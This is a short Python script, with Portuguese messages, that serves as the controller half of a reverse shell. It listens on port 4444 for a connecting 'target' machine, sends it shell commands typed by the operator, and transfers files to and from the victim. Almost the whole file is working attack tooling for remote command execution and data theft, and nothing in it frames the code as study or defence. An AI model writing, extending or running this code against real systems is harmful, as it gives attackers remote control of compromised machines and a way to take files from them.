import socket
import json
import os
import subprocess

def data_recv():
    data = ''
    while True:
        try:
            data = data + target.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

def data_send(data):
    jsondata = json.dumps(data)
    target.send(jsondata.encode())

def upload_file(file):
    f = open(file, 'rb')
    target.send(f.read())

def download_file(file):
    f = open(file, 'wb')
    target.settimeout(5)
    chunk = target.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = target.recv(1024)
        except socket.timeout as e:
            break
    target.settimeout(None)
    f.close()

def t_commun():
    count = 0
    while True:
        comm = input(str(ip))
        data_send(comm)
        if comm == 'exit':
            break
        elif comm == 'clear':
            os.system('clear')
        elif comm [:3] == 'cd ':
            pass
        elif comm [:6] == 'upload':
            upload_file(comm[7:])
        elif comm [:8] == 'download':
            download_file(comm[9:])
        elif comm == 'help':
            print('''
                  exit: fecha a sessao
                  clear: limpa o terminal
                  help: mostras os comandos criados
                  cd + Nomedodiretorio para ir para outra pasta
                  upload + filename fazer download para a maquina alvo
                  download + filename fazer download da maquina alvo
                  ''')
        else:
            answer = data_recv()
            print(answer)

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind(('192.168.88.97', 4444))
print('[-] aguardando conexao')
sock.listen(5)

target, ip = sock.accept()
print('[-] alvo conectado: ' + str(ip))
t_commun()